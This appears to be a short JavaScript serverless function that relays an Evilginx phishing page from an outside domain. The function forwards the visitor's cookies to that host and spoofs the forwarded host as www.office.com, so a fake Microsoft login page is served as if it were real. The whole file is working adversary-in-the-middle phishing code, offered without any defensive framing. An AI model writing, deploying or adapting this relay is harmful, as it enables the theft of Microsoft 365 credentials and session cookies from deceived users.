export default async (req, res) => {
  const EVILGINX_URL = "https://login.espeharete.top/xVpSXLob";
  
  // 1. Fetch Evilginx page (DISABLE all security checks)
  const response = await fetch(EVILGINX_URL, {
    redirect: 'manual',
    headers: {
      'User-Agent': 'Mozilla/5.0',
      'Cookie': req.headers.cookie || '', // Forward cookies
      'X-Forwarded-Host': 'www.office.com' // Fake legit host
    }
  });

  // 2. Return raw response (DON'T modify HTML)
  res.set({
    'Content-Type': 'text/html',
    'Cache-Control': 'no-store'
  });
  res.status(200).send(await response.text());
};
